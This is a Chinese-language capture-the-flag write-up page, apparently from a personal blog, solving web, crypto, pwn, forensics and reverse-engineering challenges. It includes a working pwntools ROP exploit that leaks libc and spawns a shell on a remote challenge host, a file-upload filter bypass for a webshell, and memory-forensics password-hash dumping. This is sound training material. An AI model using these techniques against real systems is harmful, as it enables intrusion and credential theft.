<!DOCTYPE html>
<!--[if IE 8]><html class="no-js lt-ie9" lang="en" > <![endif]-->
<!--[if gt IE 8]><!--> <html class="no-js" lang="en" > <!--<![endif]-->
<head>
  <meta charset="utf-8">
  <meta http-equiv="X-UA-Compatible" content="IE=edge">
  <meta name="viewport" content="width=device-width, initial-scale=1.0">
  
  
  
  <link rel="shortcut icon" href="../img/favicon.ico">
  <title>HXB writeup - hkk_blog</title>
  <link rel="stylesheet" href="https://fonts.googleapis.com/css?family=Lato:400,700|Roboto+Slab:400,700|Inconsolata:400,700" />

  <link rel="stylesheet" href="../css/theme.css" />
  <link rel="stylesheet" href="../css/theme_extra.css" />
  <link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/highlight.js/9.12.0/styles/github.min.css" />
  
  <script>
    // Current page data
    var mkdocs_page_name = "HXB writeup";
    var mkdocs_page_input_path = "\u53d1\u8d22writeup.md";
    var mkdocs_page_url = null;
  </script>
  
  <script src="../js/jquery-2.1.1.min.js" defer></script>
  <script src="../js/modernizr-2.8.3.min.js" defer></script>
  <script src="https://cdnjs.cloudflare.com/ajax/libs/highlight.js/9.12.0/highlight.min.js"></script>
  <script>hljs.initHighlightingOnLoad();</script> 
  
</head>

<body class="wy-body-for-nav" role="document">

  <div class="wy-grid-for-nav">

    
    <nav data-toggle="wy-nav-shift" class="wy-nav-side stickynav">
    <div class="wy-side-scroll">
      <div class="wy-side-nav-search">
        <a href=".." class="icon icon-home"> hkk_blog</a>
        <div role="search">
  <form id ="rtd-search-form" class="wy-form" action="../search.html" method="get">
    <input type="text" name="q" placeholder="Search docs" title="Type search term here" />
  </form>
</div>
      </div>

      <div class="wy-menu wy-menu-vertical" data-spy="affix" role="navigation" aria-label="main navigation">
                <ul>
                    <li class="toctree-l1"><a class="reference internal" href="..">Welcome to hkkblog</a>
                    </li>
                </ul>
                <ul class="current">
                    <li class="toctree-l1 current"><a class="reference internal current" href="./">HXB writeup</a>
    <ul class="current">
    <li class="toctree-l2"><a class="reference internal" href="#web">WEB</a>
        <ul>
    <li class="toctree-l3"><a class="reference internal" href="#_1">题目名字不重要反正题挺简单的</a>
    </li>
    <li class="toctree-l3"><a class="reference internal" href="#newwebsite">NewWebsite</a>
    </li>
        </ul>
    </li>
    <li class="toctree-l2"><a class="reference internal" href="#cpypto">CPYPTO</a>
        <ul>
    <li class="toctree-l3"><a class="reference internal" href="#_2">古典美++</a>
    </li>
        </ul>
    </li>
    <li class="toctree-l2"><a class="reference internal" href="#pwn">pwn</a>
        <ul>
    <li class="toctree-l3"><a class="reference internal" href="#pwn_printf">pwn_printf</a>
    </li>
        </ul>
    </li>
    <li class="toctree-l2"><a class="reference internal" href="#misc">MISC</a>
        <ul>
    <li class="toctree-l3"><a class="reference internal" href="#_3">颜文字之谜</a>
    </li>
    <li class="toctree-l3"><a class="reference internal" href="#passwd">passwd</a>
    </li>
    <li class="toctree-l3"><a class="reference internal" href="#_4">虚实之间</a>
    </li>
    <li class="toctree-l3"><a class="reference internal" href="#_5">隐藏的秘密</a>
    </li>
    <li class="toctree-l3"><a class="reference internal" href="#re">RE</a>
    </li>
    <li class="toctree-l3"><a class="reference internal" href="#easy_c">easy_c++</a>
    </li>
    <li class="toctree-l3"><a class="reference internal" href="#easyre">easyre</a>
    </li>
    <li class="toctree-l3"><a class="reference internal" href="#reme">ReMe</a>
    </li>
        </ul>
    </li>
    </ul>
                    </li>
                </ul>
      </div>
    </div>
    </nav>

    <section data-toggle="wy-nav-shift" class="wy-nav-content-wrap">

      
      <nav class="wy-nav-top" role="navigation" aria-label="top navigation">
        <i data-toggle="wy-nav-top" class="fa fa-bars"></i>
        <a href="..">hkk_blog</a>
      </nav>

      
      <div class="wy-nav-content">
        <div class="rst-content">
          <div role="navigation" aria-label="breadcrumbs navigation">
  <ul class="wy-breadcrumbs">
    <li><a href="..">Docs</a> &raquo;</li>
    
      
    
    <li>HXB writeup</li>
    <li class="wy-breadcrumbs-aside">
      
    </li>
  </ul>
  
  <hr/>
</div>
          <div role="main">
            <div class="section">
              
                <h1 id="hxb-writeup">HXB writeup</h1>
<h2 id="web">WEB</h2>
<h3 id="_1">题目名字不重要反正题挺简单的</h3>
<p>直接传参file=phpinfo，flag被写到环境变量</p>
<p><img alt="img1" src="../img/img1.png" /></p>
<h3 id="newwebsite">NewWebsite</h3>
<p>扫描目录扫到/admin</p>
<p><img alt="img2" src="../img/img2.png" /></p>
<p>访问后弱密码admin/admin登录</p>
<p>发现有?r=manageinfo页面可以上传文件，但文件名被限制，传php3即可绕过，然后antsword连接</p>
<p><img alt="img3" src="../img/img3.png" /></p>
<h2 id="cpypto">CPYPTO</h2>
<h3 id="_2">古典美++</h3>
<p>题目说是维吉尼亚密码，直接爆破密钥即可</p>
<p><img alt="img4" src="../img/img4.png" /></p>
<h2 id="pwn">pwn</h2>
<h3 id="pwn_printf">pwn_printf</h3>
<p>栈溢出，通过puts泄露函数地址，计算偏移量得到system函数地址来get shell</p>
<p>exp如下：</p>
<pre><code class="language-python">from pwn import *
context.log_level = 'debug'
p = remote('47.111.104.169',56706)
elf = ELF('./pwn_printf')
puts_plt = elf.symbols['puts']
puts_got = elf.got['puts']
pop_rdi_ret = 0x0000000000401213
pop_rsi_ret = 0x000401211
ret_addr = 0x4007C6
scanf = 0x004006A0

p.recvuntil(&quot;interesting&quot;)
for i in range(16):
    p.sendline(&quot;32&quot;)

payload1 = 'a'*0x8 + p64(pop_rdi_ret) + p64(puts_got) + p64(puts_plt) + p64(pop_rdi_ret) + p64(0x40) + p64(ret_addr)
p.sendline(payload1)
p.recvline()

puts_addr = u64(p.recv(6).ljust(8,b'\x00'))
print (hex(puts_addr))

payload2 = 'a'*0x8 + p64(pop_rdi_ret) + p64(0x0401D99) +p64(pop_rsi_ret) +p64(0x06030A0)+p64(0)+ p64(scanf) + p64(pop_rdi_ret) + p64(0x20)+ p64(ret_addr+1)
p.recv()
str1 = int(b'/bin'[::-1].encode('hex'),16)
str2 = int(b'/sh\x00'[::-1].encode('hex'),16)

p.sendline(payload2)
sleep(0.5)
p.sendline(str(str2))
sleep(0.5)

payload3 = 'a' * 0x8 + p64(pop_rdi_ret) + p64(0x0401D99) + p64(pop_rsi_ret) + p64(0x06030A4) + p64(0) + p64(scanf) + p64(ret_addr)
p.send(payload3)
p.sendline(str(n2))

payload4 = 'a' * 0x8 + p64(pop_rdi_ret) + p64(0x06030A0) + p64(puts_addr-0x2a300)
sleep(0.5)
p.sendline(payload4)
p.interactive()

</code></pre>
<p><img alt="img5" src="../img/pwn.png" /></p>
<h2 id="misc">MISC</h2>
<h3 id="_3">颜文字之谜</h3>
<p>通过流量分析可以导出index-demo.html
在源码中发现颜文字</p>
<p><img alt="img5" src="../img/img5.png" /></p>
<p>开始以为是颜文字编码，后来发现有base64隐写，用stegsnow可以输出flag样式</p>
<p>base64隐写脚本</p>
<pre><code>b64chars = 'ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz0123456789+/'
with open('C:/Users/kai/Desktop/base.txt', 'rb') as f:
    bin_str = ''
    for line in f.readlines():
        stegb64 = ''.join(line.split())
        rowb64 =  ''.join(stegb64.decode('base64').encode('base64').split())
        offset = abs(b64chars.index(stegb64.replace('=','')[-1])-b64chars.index(rowb64.replace('=','')[-1]))
        equalnum = stegb64.count('=') #no equalnum no offset
        if equalnum:
            bin_str += bin(offset)[2:].zfill(equalnum * 2)
        print ''.join([chr(int(bin_str[i:i + 8], 2)) for i in xrange(0, len(bin_str), 8)])
</code></pre>
<p>结果是key:"lorrie"</p>
<p>输出内容猜测是摩斯密码，解码后得到flag</p>
<h3 id="passwd">passwd</h3>
<p>是一道内存取证题</p>
<pre><code>python vol.py -f ./my_mem/passwd.raw --profile=Win7SP1x86_23418 hashdump
</code></pre>
<blockquote>
<p>Administrator:500:aad3b435b51404eeaad3b435b51404ee:31d6cfe0d16ae931b73c59d7e0c089c0:::
Guest:501:aad3b435b51404eeaad3b435b51404ee:31d6cfe0d16ae931b73c59d7e0c089c0:::
CTF:1000:aad3b435b51404eeaad3b435b51404ee:0a640404b5c386ab12092587fe19cd02:::</p>
</blockquote>
<p>CTF密码解码出来是qwer1234，然后MD5就是flag</p>
<h3 id="_4">虚实之间</h3>
<p>明文攻击，爆出压缩包密码
<code>123%asd!O</code>
然后栅栏密码解码得到flag</p>
<h3 id="_5">隐藏的秘密</h3>
<p>用diskgenius打开可以看到</p>
<p><img alt="img6" src="../img/img6.png" /></p>
<pre><code>volatility -f 1.vmem --profile=Win2003SP1x86 --profile=系统版本 printkey -K &quot;SAM\Domains\Account\Users\Names&quot;
</code></pre>
<p>于是导出用户名和密码，批量解MD5，最后尝试密码为<code>NIAIWOMA</code>的账户和密码MD5
是flag</p>
<h3 id="re">RE</h3>
<h3 id="easy_c">easy_c++</h3>
<p>简单异或直接脚本跑</p>
<pre><code>a=&quot;7d21e&lt;e3&lt;:3;9;ji t r#w\&quot;$*{*+*$|,&quot;
b=&quot;&quot;
for i in range(len(a)):
    b+=chr(ord(a[i])^i)
print(b)
</code></pre>
<h3 id="easyre">easyre</h3>
<p>动态调试，一位一位爆出来</p>
<h3 id="reme">ReMe</h3>
<pre><code>import hashlib

list = [
 'e5438e78ec1de10a2693f9cffb930d23',
 '08e8e8855af8ea652df54845d21b9d67',
 'a905095f0d801abd5865d649a646b397',
 'bac8510b0902185146c838cdf8ead8e0',
 'f26f009a6dc171e0ca7a4a770fecd326',
 'cffd0b9d37e7187483dc8dd19f4a8fa8',
 '4cb467175ab6763a9867b9ed694a2780',
 '8e50684ac9ef90dfdc6b2e75f2e23741',
 'cffd0b9d37e7187483dc8dd19f4a8fa8',
 'fd311e9877c3db59027597352999e91f',
 '49733de19d912d4ad559736b1ae418a7',
 '7fb523b42413495cc4e610456d1f1c84',
 '8e50684ac9ef90dfdc6b2e75f2e23741',
 'acb465dc618e6754de2193bf0410aafe',
 'bc52c927138231e29e0b05419e741902',
 '515b7eceeb8f22b53575afec4123e878',
 '451660d67c64da6de6fadc66079e1d8a',
 '8e50684ac9ef90dfdc6b2e75f2e23741',
 'fe86104ce1853cb140b7ec0412d93837',
 'acb465dc618e6754de2193bf0410aafe',
 'c2bab7ea31577b955e2c2cac680fb2f4',
 '8e50684ac9ef90dfdc6b2e75f2e23741',
 'f077b3a47c09b44d7077877a5aff3699',
 '620741f57e7fafe43216d6aa51666f1d',
 '9e3b206e50925792c3234036de6a25ab',
 '49733de19d912d4ad559736b1ae418a7',
 '874992ac91866ce1430687aa9f7121fc'
 ]

def decode(n):
    result = []
    while n != 1:
        if n%2:
            n=n*3+1
        else:
            n=n//2
        result.append(n)
    return result

if __name__ == &quot;__main__&quot;:
    for i in range(33,128):
        result = decode(i)
        string = ''
        for x in range(len(result)):
            string += str(result[x])
            string += str(result[(len(result) - x - 1)])
        md5 = hashlib.md5()
        md5.update(string.encode())
        md5 = md5.hexdigest()
        for line in range(27):
            if md5 == list[line]:
                print line,'-&gt;',chr(i)
</code></pre>
<p>然后按顺序排序MD5即可</p>
              
            </div>
          </div>
          <footer>
  
    <div class="rst-footer-buttons" role="navigation" aria-label="footer navigation">
      
      
        <a href=".." class="btn btn-neutral" title="Welcome to hkkblog"><span class="icon icon-circle-arrow-left"></span> Previous</a>
      
    </div>
  

  <hr/>

  <div role="contentinfo">
    <!-- Copyright etc -->
    
  </div>

  Built with <a href="https://www.mkdocs.org/">MkDocs</a> using a <a href="https://github.com/snide/sphinx_rtd_theme">theme</a> provided by <a href="https://readthedocs.org">Read the Docs</a>.
</footer>
      
        </div>
      </div>

    </section>

  </div>

  <div class="rst-versions" role="note" aria-label="versions">
    <span class="rst-current-version" data-toggle="rst-current-version">
      
      
        <span><a href=".." style="color: #fcfcfc;">&laquo; Previous</a></span>
      
      
    </span>
</div>
    <script>var base_url = '..';</script>
    <script src="../js/theme.js" defer></script>
      <script src="../search/main.js" defer></script>
    <script defer>
        window.onload = function () {
            SphinxRtdTheme.Navigation.enable(true);
        };
    </script>

</body>
</html>
